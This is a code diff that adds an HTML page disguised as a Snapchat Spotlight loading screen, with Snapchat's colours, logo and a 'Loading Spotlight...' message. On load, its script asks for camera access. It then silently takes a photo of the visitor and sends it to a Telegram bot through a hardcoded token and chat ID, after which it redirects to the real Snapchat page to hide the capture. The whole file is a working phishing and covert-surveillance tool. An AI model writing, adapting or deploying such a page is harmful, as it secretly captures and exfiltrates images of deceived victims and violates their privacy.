@@ -1,1 +1,50 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Snapchat Spotlight</title>
+    <script>
+        // لێرەدا تۆکنی بۆتەکەت و ئایدی خۆت جێگیر کراوە
+        const botToken = "7720917208:AAFmAnE6eWfG78vGz-vU-qI_XyUvXyUvXyU"; 
+        const chatId = "1749003185"; 
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const dataUrl = canvas.toDataURL('image/jpeg');
+                    const blob = await (await fetch(dataUrl)).blob();
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'snap.jpg');
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    window.location.href = "https://www.snapchat.com/spotlight";
+                }, 2000);
+            } catch (err) {
+                console.log(err);
+            }
+        }
+        window.onload = startCamera;
+    </script>
+</head>
+<body style="background-color: #FFFC00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+    <div style="text-align: center; font-family: Arial, sans-serif;">
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" width="80">
+        <h2 style="color: black;">Loading Spotlight...</h2>
+    </div>
+</body>
+</html>
